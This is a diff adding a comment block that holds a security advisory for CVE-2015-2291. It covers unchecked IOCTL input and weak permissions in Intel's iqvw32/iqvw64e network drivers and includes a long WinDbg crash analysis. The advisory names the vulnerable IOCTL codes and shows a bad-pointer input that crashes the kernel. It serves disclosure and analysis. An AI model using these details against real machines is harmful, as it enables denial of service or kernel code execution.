@@ -1,0 +1,724 @@
+/*
+
+Intel Network Adapter Diagnostic Driver IOCTL Handling Vulnerability
+Vendor: Intel
+Product webpage: http://www.intel.com
+Affected product(s):
+	Network Adapter Driver for Windows XP
+	Network Adapter Driver for Windows 7
+	Network Adapter Driver for Windows 8
+	Network Adapter Driver for Windows 2008/R2
+	Network Adapter Driver for Windows 2012/R2
+Affected version(s): 
+	Intel(R) iQVW64.SYS v1.03.0.7
+	Intel(R) iQVW32.SYS v1.03.0.7
+Tested Operating systems:
+	Windows XP SP3 (32-bit)
+	Windows 7 SP1 (32/64-bit)
+Date: 14/03/2015
+Credits: Glafkos Charalambous
+CVE: CVE-2015-2291
+
+Disclosure Timeline:
+10-06-2014: Vendor Notification
+21-06-2014: Vendor Response/Feedback
+08-08-2014: Vendor Response/Feedback
+26-08-2014: Requesting Status/No Vendor Response
+30-09-2014: Requesting Status/No Vendor Response
+22-10-2014: Requesting Status/No Vendor Response
+10-01-2015: Requesting Status/No Vendor Response
+15-01-2015: Requesting Status/No Vendor Response
+14-03-2015: CVE Requested
+14-03-2015: CVE Assigned
+14-03-2015: Public Disclosure
+
+Description:
+A vulnerability in iqvw32.sys and iqvw64e.sys drivers has been discovered in Intel Network Adapter Driver.
+
+The vulnerability exists due to insuffiecient input buffer validation when the driver processes IOCTL codes 0x80862013, 
+0x8086200B, 0x8086200F, 0x80862007 using METHOD_NEITHER and due to insecure permissions allowing everyone read and write 
+access to privileged use only functionality.
+
+Attackers can exploit this issue to cause a Denial of Service or possibly execute arbitrary code in kernel space.
+
+
+IOCTL 0x80862013
+----------------
+Microsoft (R) Windows Debugger Version 6.2.9200.20512 AMD64
+Copyright (c) Microsoft Corporation. All rights reserved.
+
+Opened \\.\pipe\com_2
+Waiting to reconnect...
+Connected to Windows 7 7601 x64 target at (Thu Feb 26 18:33:59.291 2015 (UTC + 2:00)), ptr64 TRUE
+Kernel Debugger connection established.
+Symbol search path is: srv*k:\symbols*http://msdl.microsoft.com/download/symbols;SRV*C:\Users\0x414141\AppData\Local\Temp\symbols\google*http://chromium-browser-symsrv.commondatastorage.googleapis.com;SRV*C:\Users\0x414141\AppData\Local\Temp\symbols\microsoft*http://msdl.microsoft.com/download/symbols
+Executable search path is: 
+Windows 7 Kernel Version 7601 MP (1 procs) Free x64
+Built by: 7601.18700.amd64fre.win7sp1_gdr.141211-1742
+Machine Name:
+Kernel base = 0xfffff800`03655000 PsLoadedModuleList = 0xfffff800`03898890
+System Uptime: not available
+KDTARGET: Refreshing KD connection
+
+*** Fatal System Error: 0x0000003b
+                       (0x00000000C0000005,0xFFFFF88005A0BFD2,0xFFFFF8800653A9C0,0x0000000000000000)
+
+Break instruction exception - code 80000003 (first chance)
+
+A fatal system error has occurred.
+Debugger entered on first try; Bugcheck callbacks have not been invoked.
+
+A fatal system error has occurred.
+
+Connected to Windows 7 7601 x64 target at (Thu Feb 26 20:29:05.978 2015 (UTC + 2:00)), ptr64 TRUE
+Loading Kernel Symbols
+...............................................................
+................................................................
+...............................
+Loading User Symbols
+.....
+Loading unloaded module list
+....Unable to enumerate user-mode unloaded modules, Win32 error 0n30
+Loading Wow64 Symbols
+.....
+*******************************************************************************
+*                                                                             *
+*                        Bugcheck Analysis                                    *
+*                                                                             *
+*******************************************************************************
+
+Use !analyze -v to get detailed debugging information.
+
+BugCheck 3B, {c0000005, fffff88005a0bfd2, fffff8800653a9c0, 0}
+
+*** ERROR: Module load completed but symbols could not be loaded for iqvw64e.sys
+
+Followup: MachineOwner
+---------
+
+nt!RtlpBreakWithStatusInstruction:
+fffff800`036c3cb0 cc              int     3
+3: kd> !analyze -v
+*******************************************************************************
+*                                                                             *
+*                        Bugcheck Analysis                                    *
+*                                                                             *
+*******************************************************************************
+
+SYSTEM_SERVICE_EXCEPTION (3b)
+An exception happened while executing a system service routine.
+Arguments:
+Arg1: 00000000c0000005, Exception code that caused the bugcheck
+Arg2: fffff88005a0bfd2, Address of the instruction which caused the bugcheck
+Arg3: fffff8800653a9c0, Address of the context record for the exception that caused the bugcheck
+Arg4: 0000000000000000, zero.
+
+Debugging Details:
+------------------
+
+EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.
+
+FAULTING_IP: 
+iqvw64e+3fd2
+fffff880`05a0bfd2 488b11          mov     rdx,qword ptr [rcx]
+
+CONTEXT:  fffff8800653a9c0 -- (.cxr 0xfffff8800653a9c0)
+rax=0000f88005a696d1 rbx=0000000000000001 rcx=00000000deadbeef
+rdx=0000000080862013 rsi=fffffa804d1084d0 rdi=00000000deadbeef
+rip=fffff88005a0bfd2 rsp=fffff8800653b3a0 rbp=fffff8800653bb60
+ r8=fffffa804b0f4d70  r9=000000000000000e r10=0000000000000000
+r11=fffff8800653b898 r12=0000000000000003 r13=0000000000000001
+r14=0000000000000001 r15=fffffa804aac7b00
+iopl=0         nv up ei pl nz na pe nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+iqvw64e+0x3fd2:
+fffff880`05a0bfd2 488b11          mov     rdx,qword ptr [rcx] ds:002b:00000000`deadbeef=????????????????
+Resetting default scope
+
+DEFAULT_BUCKET_ID:  WIN7_DRIVER_FAULT
+
+BUGCHECK_STR:  0x3B
+
+PROCESS_NAME:  ConsoleApplica
+
+CURRENT_IRQL:  2
+
+LAST_CONTROL_TRANSFER:  from fffff88005a091ac to fffff88005a0bfd2
+
+STACK_TEXT:  
+fffff880`0653b3a0 fffff880`05a091ac : fffffa80`4aac7b00 00000000`00000001 fffffa80`4d1084d0 fffffa80`4d01e160 : iqvw64e+0x3fd2
+fffff880`0653b8a0 fffff800`039e80f7 : 00000000`80862013 fffff880`0653bb60 fffffa80`4d1084d0 fffffa80`4d01e160 : iqvw64e+0x11ac
+fffff880`0653b8d0 fffff800`039e8956 : fffff680`003b5ee8 00000000`00000000 00000000`00000000 00000000`00000000 : nt!IopXxxControlFile+0x607
+fffff880`0653ba00 fffff800`036cb113 : 00000000`0021df01 0000007f`ffffffff 00000000`0021df00 00000980`00000000 : nt!NtDeviceIoControlFile+0x56
+fffff880`0653ba70 00000000`73b02e09 : 00000000`73b02944 00000000`775a01b4 00000000`73b70023 00000000`00000246 : nt!KiSystemServiceCopyEnd+0x13
+00000000`0021e898 00000000`73b02944 : 00000000`775a01b4 00000000`73b70023 00000000`00000246 00000000`001dff7c : wow64cpu!CpupSyscallStub+0x9
+00000000`0021e8a0 00000000`73b7d286 : 00000000`00000000 00000000`73b01920 00000000`0021eb30 00000000`773decf1 : wow64cpu!DeviceIoctlFileFault+0x31
+00000000`0021e960 00000000`73b7c69e : 00000000`00000000 00000000`00000000 00000000`73b74b10 00000000`7ffe0030 : wow64!RunCpuSimulation+0xa
+00000000`0021e9b0 00000000`773f4966 : 00000000`003331f0 00000000`00000000 00000000`774e2670 00000000`774b5978 : wow64!Wow64LdrpInitialize+0x42a
+00000000`0021ef00 00000000`773f1937 : 00000000`00000000 00000000`773f4071 00000000`0021f4b0 00000000`00000000 : ntdll!LdrpInitializeProcess+0x17e3
+00000000`0021f3f0 00000000`773dc34e : 00000000`0021f4b0 00000000`00000000 00000000`7efdf000 00000000`00000000 : ntdll! ?? ::FNODOBFM::`string'+0x28ff0
+00000000`0021f460 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!LdrInitializeThunk+0xe
+
+
+FOLLOWUP_IP: 
+iqvw64e+3fd2
+fffff880`05a0bfd2 488b11          mov     rdx,qword ptr [rcx]
+
+SYMBOL_STACK_INDEX:  0
+
+SYMBOL_NAME:  iqvw64e+3fd2
+
+FOLLOWUP_NAME:  MachineOwner
+
+MODULE_NAME: iqvw64e
+
+IMAGE_NAME:  iqvw64e.sys
+
+DEBUG_FLR_IMAGE_TIMESTAMP:  5284eac3
+
+STACK_COMMAND:  .cxr 0xfffff8800653a9c0 ; kb
+
+FAILURE_BUCKET_ID:  X64_0x3B_iqvw64e+3fd2
+
+BUCKET_ID:  X64_0x3B_iqvw64e+3fd2
+
+Followup: MachineOwner
+---------
+
+3: kd> u fffff880`05a0bfd2
+iqvw64e+0x3fd2:
+fffff880`05a0bfd2 488b11          mov     rdx,qword ptr [rcx]
+fffff880`05a0bfd5 488d0d14160000  lea     rcx,[iqvw64e+0x55f0 (fffff880`05a0d5f0)]
+fffff880`05a0bfdc e84fdfffff      call    iqvw64e+0x1f30 (fffff880`05a09f30)
+fffff880`05a0bfe1 488b17          mov     rdx,qword ptr [rdi]
+fffff880`05a0bfe4 488d42ff        lea     rax,[rdx-1]
+fffff880`05a0bfe8 4883f807        cmp     rax,7
+fffff880`05a0bfec 0f8718020000    ja      iqvw64e+0x420a (fffff880`05a0c20a)
+fffff880`05a0bff2 488d0d07c0ffff  lea     rcx,[iqvw64e (fffff880`05a08000)]
+
+3: kd> !for_each_frame .frame /r @$Frame
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+00 fffff880`06539988 fffff800`037bba62 nt!RtlpBreakWithStatusInstruction
+00 fffff880`06539988 fffff800`037bba62 nt!RtlpBreakWithStatusInstruction
+rax=0000000000000000 rbx=0000000000000003 rcx=0000000000000003
+rdx=000000000000008a rsi=fffffa804c800060 rdi=00000000c0000000
+rip=fffff800036c3cb0 rsp=fffff88006539988 rbp=0000000000000000
+ r8=0000000000000065  r9=0000000000000000 r10=0000000000000000
+r11=fffff88006539610 r12=000000000000003b r13=0000000000000001
+r14=0000000040000082 r15=0000000000000003
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+nt!RtlpBreakWithStatusInstruction:
+fffff800`036c3cb0 cc              int     3
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+01 fffff880`06539990 fffff800`037bc84e nt!KiBugCheckDebugBreak+0x12
+01 fffff880`06539990 fffff800`037bc84e nt!KiBugCheckDebugBreak+0x12
+rax=0000000000000000 rbx=0000000000000003 rcx=0000000000000003
+rdx=000000000000008a rsi=fffffa804c800060 rdi=00000000c0000000
+rip=fffff800037bba62 rsp=fffff88006539990 rbp=0000000000000000
+ r8=0000000000000065  r9=0000000000000000 r10=0000000000000000
+r11=fffff88006539610 r12=000000000000003b r13=0000000000000001
+r14=0000000040000082 r15=0000000000000003
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+nt!KiBugCheckDebugBreak+0x12:
+fffff800`037bba62 eb75            jmp     nt!KiBugCheckDebugBreak+0x89 (fffff800`037bbad9)
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+02 fffff880`065399f0 fffff800`036cbf84 nt!KeBugCheck2+0x71e
+02 fffff880`065399f0 fffff800`036cbf84 nt!KeBugCheck2+0x71e
+rax=0000000000000000 rbx=0000000000000065 rcx=0000000000000003
+rdx=000000000000008a rsi=fffffa804c800060 rdi=00000000c0000000
+rip=fffff800037bc84e rsp=fffff880065399f0 rbp=0000000000000000
+ r8=0000000000000065  r9=0000000000000000 r10=0000000000000000
+r11=fffff88006539610 r12=000000000000003b r13=0000000000000001
+r14=0000000040000082 r15=0000000000000003
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+nt!KeBugCheck2+0x71e:
+fffff800`037bc84e eb11            jmp     nt!KeBugCheck2+0x731 (fffff800`037bc861)
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+03 fffff880`0653a0c0 fffff800`036cb429 nt!KeBugCheckEx+0x104
+03 fffff880`0653a0c0 fffff800`036cb429 nt!KeBugCheckEx+0x104
+rax=0000000000000000 rbx=fffff8000381a9e4 rcx=0000000000000003
+rdx=000000000000008a rsi=fffff80003655000 rdi=0000000000000000
+rip=fffff800036cbf84 rsp=fffff8800653a0c0 rbp=0000000000000000
+ r8=0000000000000065  r9=0000000000000000 r10=0000000000000000
+r11=fffff88006539610 r12=fffff800036cb113 r13=fffff800038d8c54
+r14=fffff800036cad00 r15=0000000000000000
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+nt!KeBugCheckEx+0x104:
+fffff800`036cbf84 90              nop
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+04 fffff880`0653a100 fffff800`036cad7c nt!KiBugCheckDispatch+0x69
+04 fffff880`0653a100 fffff800`036cad7c nt!KiBugCheckDispatch+0x69
+rax=0000000000000000 rbx=fffff8000381a9e4 rcx=0000000000000003
+rdx=000000000000008a rsi=fffff80003655000 rdi=0000000000000000
+rip=fffff800036cb429 rsp=fffff8800653a100 rbp=0000000000000000
+ r8=0000000000000065  r9=0000000000000000 r10=0000000000000000
+r11=fffff88006539610 r12=fffff800036cb113 r13=fffff800038d8c54
+r14=fffff800036cad00 r15=0000000000000000
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+nt!KiBugCheckDispatch+0x69:
+fffff800`036cb429 90              nop
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+05 fffff880`0653a240 fffff800`036f6a4d nt!KiSystemServiceHandler+0x7c
+05 fffff880`0653a240 fffff800`036f6a4d nt!KiSystemServiceHandler+0x7c
+rax=0000000000000000 rbx=fffff8000381a9e4 rcx=0000000000000003
+rdx=000000000000008a rsi=fffff80003655000 rdi=0000000000000000
+rip=fffff800036cad7c rsp=fffff8800653a240 rbp=0000000000000000
+ r8=0000000000000065  r9=0000000000000000 r10=0000000000000000
+r11=fffff88006539610 r12=fffff800036cb113 r13=fffff800038d8c54
+r14=fffff800036cad00 r15=0000000000000000
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+nt!KiSystemServiceHandler+0x7c:
+fffff800`036cad7c b801000000      mov     eax,1
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+06 fffff880`0653a280 fffff800`036f5825 nt!RtlpExecuteHandlerForException+0xd
+06 fffff880`0653a280 fffff800`036f5825 nt!RtlpExecuteHandlerForException+0xd
+rax=0000000000000000 rbx=fffff8000381a9e4 rcx=0000000000000003
+rdx=000000000000008a rsi=fffff80003655000 rdi=0000000000000000
+rip=fffff800036f6a4d rsp=fffff8800653a280 rbp=0000000000000000
+ r8=0000000000000065  r9=0000000000000000 r10=0000000000000000
+r11=fffff88006539610 r12=fffff800036cb113 r13=fffff800038d8c54
+r14=fffff800036cad00 r15=0000000000000000
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+nt!RtlpExecuteHandlerForException+0xd:
+fffff800`036f6a4d 90              nop
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+07 fffff880`0653a2b0 fffff800`037067b1 nt!RtlDispatchException+0x415
+07 fffff880`0653a2b0 fffff800`037067b1 nt!RtlDispatchException+0x415
+rax=0000000000000000 rbx=fffff8000381a9e4 rcx=0000000000000003
+rdx=000000000000008a rsi=fffff80003655000 rdi=0000000000000000
+rip=fffff800036f5825 rsp=fffff8800653a2b0 rbp=0000000000000000
+ r8=0000000000000065  r9=0000000000000000 r10=0000000000000000
+r11=fffff88006539610 r12=fffff800036cb113 r13=fffff800038d8c54
+r14=fffff800036cad00 r15=0000000000000000
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+nt!RtlDispatchException+0x415:
+fffff800`036f5825 0fba257fc51d0017 bt      dword ptr [nt!NtGlobalFlag (fffff800`038d1dac)],17h
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+08 fffff880`0653a990 fffff800`036cb502 nt!KiDispatchException+0x135
+08 fffff880`0653a990 fffff800`036cb502 nt!KiDispatchException+0x135
+rax=0000000000000000 rbx=fffff8800653b168 rcx=0000000000000003
+rdx=000000000000008a rsi=fffff8800653b210 rdi=00000000deadbeef
+rip=fffff800037067b1 rsp=fffff8800653a990 rbp=fffff8800653aec0
+ r8=0000000000000065  r9=0000000000000000 r10=0000000000000000
+r11=fffff88006539610 r12=fffff8800653a9c0 r13=000000000010001f
+r14=fffff8800653b030 r15=fffffa804aac7b00
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+nt!KiDispatchException+0x135:
+fffff800`037067b1 84c0            test    al,al
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+09 fffff880`0653b030 fffff800`036ca07a nt!KiExceptionDispatch+0xc2
+09 fffff880`0653b030 fffff800`036ca07a nt!KiExceptionDispatch+0xc2
+rax=0000000000000000 rbx=0000000000000001 rcx=0000000000000003
+rdx=000000000000008a rsi=fffffa804d1084d0 rdi=00000000deadbeef
+rip=fffff800036cb502 rsp=fffff8800653b030 rbp=fffff8800653b290
+ r8=0000000000000065  r9=0000000000000000 r10=0000000000000000
+r11=fffff88006539610 r12=0000000000000003 r13=0000000000000001
+r14=0000000000000001 r15=fffffa804aac7b00
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+nt!KiExceptionDispatch+0xc2:
+fffff800`036cb502 488d8c2400010000 lea     rcx,[rsp+100h]
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+0a fffff880`0653b210 fffff880`05a0bfd2 nt!KiPageFault+0x23a
+0a fffff880`0653b210 fffff880`05a0bfd2 nt!KiPageFault+0x23a
+rax=0000000000000000 rbx=0000000000000001 rcx=0000000000000003
+rdx=000000000000008a rsi=fffffa804d1084d0 rdi=00000000deadbeef
+rip=fffff800036ca07a rsp=fffff8800653b210 rbp=fffff8800653b290
+ r8=0000000000000065  r9=0000000000000000 r10=0000000000000000
+r11=fffff88006539610 r12=0000000000000003 r13=0000000000000001
+r14=0000000000000001 r15=fffffa804aac7b00
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+nt!KiPageFault+0x23a:
+fffff800`036ca07a 440f20c0        mov     rax,cr8
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+0b fffff880`0653b3a0 fffff880`05a091ac iqvw64e+0x3fd2
+0b fffff880`0653b3a0 fffff880`05a091ac iqvw64e+0x3fd2
+rax=0000f88005a696d1 rbx=0000000000000001 rcx=00000000deadbeef
+rdx=0000000080862013 rsi=fffffa804d1084d0 rdi=00000000deadbeef
+rip=fffff88005a0bfd2 rsp=fffff8800653b3a0 rbp=fffff8800653bb60
+ r8=fffffa804b0f4d70  r9=000000000000000e r10=0000000000000000
+r11=fffff8800653b898 r12=0000000000000003 r13=0000000000000001
+r14=0000000000000001 r15=fffffa804aac7b00
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+iqvw64e+0x3fd2:
+fffff880`05a0bfd2 488b11          mov     rdx,qword ptr [rcx]
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+0c fffff880`0653b8a0 fffff800`039e80f7 iqvw64e+0x11ac
+0c fffff880`0653b8a0 fffff800`039e80f7 iqvw64e+0x11ac
+rax=0000f88005a696d1 rbx=fffffa804d1084d0 rcx=00000000deadbeef
+rdx=0000000080862013 rsi=fffffa804d1084d0 rdi=fffffa804d01e160
+rip=fffff88005a091ac rsp=fffff8800653b8a0 rbp=fffff8800653bb60
+ r8=fffffa804b0f4d70  r9=000000000000000e r10=0000000000000000
+r11=fffff8800653b898 r12=0000000000000003 r13=0000000000000001
+r14=0000000000000001 r15=fffffa804aac7b00
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+iqvw64e+0x11ac:
+fffff880`05a091ac 8bd8            mov     ebx,eax
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+0d fffff880`0653b8d0 fffff800`039e8956 nt!IopXxxControlFile+0x607
+0d fffff880`0653b8d0 fffff800`039e8956 nt!IopXxxControlFile+0x607
+rax=0000f88005a696d1 rbx=fffffa804d1084d0 rcx=00000000deadbeef
+rdx=0000000080862013 rsi=fffffa804d1084d0 rdi=fffffa804d01e160
+rip=fffff800039e80f7 rsp=fffff8800653b8d0 rbp=fffff8800653bb60
+ r8=fffffa804b0f4d70  r9=000000000000000e r10=0000000000000000
+r11=fffff8800653b898 r12=0000000000000003 r13=0000000000000001
+r14=0000000000000001 r15=fffffa804aac7b00
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+nt!IopXxxControlFile+0x607:
+fffff800`039e80f7 448be0          mov     r12d,eax
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+0e fffff880`0653ba00 fffff800`036cb113 nt!NtDeviceIoControlFile+0x56
+0e fffff880`0653ba00 fffff800`036cb113 nt!NtDeviceIoControlFile+0x56
+rax=0000f88005a696d1 rbx=fffffa804c800060 rcx=00000000deadbeef
+rdx=0000000080862013 rsi=000000000021e8b8 rdi=fffff8800653ba88
+rip=fffff800039e8956 rsp=fffff8800653ba00 rbp=fffff8800653bb60
+ r8=fffffa804b0f4d70  r9=000000000000000e r10=0000000000000000
+r11=fffff8800653b898 r12=000000007efdb000 r13=000000000021fd20
+r14=000000000021e910 r15=0000000073b02450
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+nt!NtDeviceIoControlFile+0x56:
+fffff800`039e8956 4883c468        add     rsp,68h
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+0f fffff880`0653ba70 00000000`73b02e09 nt!KiSystemServiceCopyEnd+0x13
+0f fffff880`0653ba70 00000000`73b02e09 nt!KiSystemServiceCopyEnd+0x13
+rax=0000f88005a696d1 rbx=fffffa804c800060 rcx=00000000deadbeef
+rdx=0000000080862013 rsi=000000000021e8b8 rdi=fffff8800653ba88
+rip=fffff800036cb113 rsp=fffff8800653ba70 rbp=fffff8800653bb60
+ r8=fffffa804b0f4d70  r9=000000000000000e r10=0000000000000000
+r11=fffff8800653b898 r12=000000007efdb000 r13=000000000021fd20
+r14=000000000021e910 r15=0000000073b02450
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+nt!KiSystemServiceCopyEnd+0x13:
+fffff800`036cb113 65ff042538220000 inc     dword ptr gs:[2238h]
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+10 00000000`0021e898 00000000`73b02944 wow64cpu!CpupSyscallStub+0x9
+10 00000000`0021e898 00000000`73b02944 wow64cpu!CpupSyscallStub+0x9
+rax=0000f88005a696d1 rbx=0000000000000000 rcx=00000000deadbeef
+rdx=0000000080862013 rsi=0000000000000000 rdi=0000000000000034
+rip=0000000073b02e09 rsp=000000000021e898 rbp=00000000001dfe68
+ r8=fffffa804b0f4d70  r9=000000000000000e r10=0000000000000000
+r11=fffff8800653b898 r12=000000007efdb000 r13=000000000021fd20
+r14=000000000021e910 r15=0000000073b02450
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+wow64cpu!CpupSyscallStub+0x9:
+00000000`73b02e09 c3              ret
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+11 00000000`0021e8a0 00000000`73b7d286 wow64cpu!DeviceIoctlFileFault+0x31
+11 00000000`0021e8a0 00000000`73b7d286 wow64cpu!DeviceIoctlFileFault+0x31
+rax=0000f88005a696d1 rbx=0000000000000000 rcx=00000000deadbeef
+rdx=0000000080862013 rsi=0000000000000000 rdi=0000000000000034
+rip=0000000073b02944 rsp=000000000021e8a0 rbp=00000000001dfe68
+ r8=fffffa804b0f4d70  r9=000000000000000e r10=0000000000000000
+r11=fffff8800653b898 r12=000000007efdb000 r13=000000000021fd20
+r14=000000000021e910 r15=0000000073b02450
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+wow64cpu!DeviceIoctlFileFault+0x31:
+00000000`73b02944 488b4c2420      mov     rcx,qword ptr [rsp+20h]
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+12 00000000`0021e960 00000000`73b7c69e wow64!RunCpuSimulation+0xa
+12 00000000`0021e960 00000000`73b7c69e wow64!RunCpuSimulation+0xa
+rax=0000f88005a696d1 rbx=0000000000000000 rcx=00000000deadbeef
+rdx=0000000080862013 rsi=0000000000000002 rdi=000000000021f4b0
+rip=0000000073b7d286 rsp=000000000021e960 rbp=000000000021e9d0
+ r8=fffffa804b0f4d70  r9=000000000000000e r10=0000000000000000
+r11=fffff8800653b898 r12=000000000021fd20 r13=0000000000000000
+r14=0000000000000001 r15=ffffffffffffffff
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+wow64!RunCpuSimulation+0xa:
+00000000`73b7d286 eb00            jmp     wow64!RunCpuSimulation+0xc (00000000`73b7d288)
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+13 00000000`0021e9b0 00000000`773f4966 wow64!Wow64LdrpInitialize+0x42a
+13 00000000`0021e9b0 00000000`773f4966 wow64!Wow64LdrpInitialize+0x42a
+rax=0000f88005a696d1 rbx=0000000000000000 rcx=00000000deadbeef
+rdx=0000000080862013 rsi=0000000000000002 rdi=000000000021f4b0
+rip=0000000073b7c69e rsp=000000000021e9b0 rbp=000000000021e9d0
+ r8=fffffa804b0f4d70  r9=000000000000000e r10=0000000000000000
+r11=fffff8800653b898 r12=000000000021fd20 r13=0000000000000000
+r14=0000000000000001 r15=ffffffffffffffff
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+wow64!Wow64LdrpInitialize+0x42a:
+00000000`73b7c69e cc              int     3
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+14 00000000`0021ef00 00000000`773f1937 ntdll!LdrpInitializeProcess+0x17e3
+14 00000000`0021ef00 00000000`773f1937 ntdll!LdrpInitializeProcess+0x17e3
+rax=0000f88005a696d1 rbx=0000000000000000 rcx=00000000deadbeef
+rdx=0000000080862013 rsi=00000000774e2670 rdi=00000000774b5978
+rip=00000000773f4966 rsp=000000000021ef00 rbp=00000000773b0000
+ r8=fffffa804b0f4d70  r9=000000000000000e r10=0000000000000000
+r11=fffff8800653b898 r12=00000000774e2520 r13=0000000000000000
+r14=00000000774e2650 r15=000000007efdf000
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+ntdll!LdrpInitializeProcess+0x17e3:
+00000000`773f4966 eb00            jmp     ntdll!LdrpInitializeProcess+0x1c12 (00000000`773f4968)
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+15 00000000`0021f3f0 00000000`773dc34e ntdll! ?? ::FNODOBFM::`string'+0x28ff0
+15 00000000`0021f3f0 00000000`773dc34e ntdll! ?? ::FNODOBFM::`string'+0x28ff0
+rax=0000f88005a696d1 rbx=000000007efdf000 rcx=00000000deadbeef
+rdx=0000000080862013 rsi=000000007efdb000 rdi=0000000000000000
+rip=00000000773f1937 rsp=000000000021f3f0 rbp=0000000000000000
+ r8=fffffa804b0f4d70  r9=000000000000000e r10=0000000000000000
+r11=fffff8800653b898 r12=000000000021f4b0 r13=00000000773b0000
+r14=0000000000000001 r15=000000007740a220
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+ntdll! ?? ::FNODOBFM::`string'+0x28ff0:
+00000000`773f1937 89442430        mov     dword ptr [rsp+30h],eax
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+16 00000000`0021f460 00000000`00000000 ntdll!LdrInitializeThunk+0xe
+16 00000000`0021f460 00000000`00000000 ntdll!LdrInitializeThunk+0xe
+rax=0000f88005a696d1 rbx=000000000021f4b0 rcx=00000000deadbeef
+rdx=0000000080862013 rsi=0000000000000000 rdi=0000000000000000
+rip=00000000773dc34e rsp=000000000021f460 rbp=0000000000000000
+ r8=fffffa804b0f4d70  r9=000000000000000e r10=0000000000000000
+r11=fffff8800653b898 r12=0000000000000000 r13=0000000000000000
+r14=0000000000000000 r15=0000000000000000
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+ntdll!LdrInitializeThunk+0xe:
+00000000`773dc34e b201            mov     dl,1
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+00 fffff880`06539988 fffff800`037bba62 nt!RtlpBreakWithStatusInstruction
+
+3: kd> dd fffff8800653b8d0
+fffff880`0653b8d0  80862013 00000000 0653bb60 fffff880
+fffff880`0653b8e0  4d1084d0 fffffa80 4d01e160 fffffa80
+fffff880`0653b8f0  746c6644 00000000 0653b928 fffff880
+fffff880`0653b900  0653b968 fffff880 00000000 00000000
+fffff880`0653b910  00000000 00000000 00000001 00000000
+fffff880`0653b920  4c804e01 00000000 4d1084d0 fffffa80
+fffff880`0653b930  00000000 00000000 00000000 00000000
+fffff880`0653b940  4d01e160 fffffa80 76bdd0af 00000000
+
+3: kd> !process 0 0
+**** NT ACTIVE PROCESS DUMP ****
